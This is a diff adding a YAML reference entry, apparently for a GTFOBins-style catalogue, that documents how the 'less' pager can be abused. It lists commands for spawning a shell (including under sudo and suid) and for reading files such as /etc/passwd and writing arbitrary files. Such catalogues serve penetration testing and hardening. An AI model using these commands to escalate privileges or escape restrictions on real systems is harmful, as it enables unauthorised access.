@@ -1,0 +1,45 @@
+---
+functions:
+  shell:
+    - code: |-
+        less /etc/passwd
+        !/bin/sh
+      contexts:
+        unprivileged:
+        sudo:
+        suid:
+          shell: true
+    - code: |-
+        VISUAL="/bin/sh -c '/bin/sh'" less /etc/passwd
+        v
+      contexts:
+        unprivileged:
+        suid:
+          shell: true
+        sudo:
+          code: |-
+            sudo VISUAL="/bin/sh -c '/bin/sh'" less /etc/passwd
+            v
+  file-read:
+    - code: |-
+        less /path/to/input-file
+      contexts:
+        unprivileged:
+        suid:
+        sudo:
+    - comment: |-
+        This can be used to read another file, e.g., when invoked as a pager with some fixed content.
+      code: |-
+        less /etc/passwd
+        :e /path/to/input-file
+  file-write:
+    - code: |-
+        echo DATA | less
+        s/path/to/output-file
+        q
+  inherit:
+    - code: |-
+        less /etc/profile
+        v
+      from: vi
+...
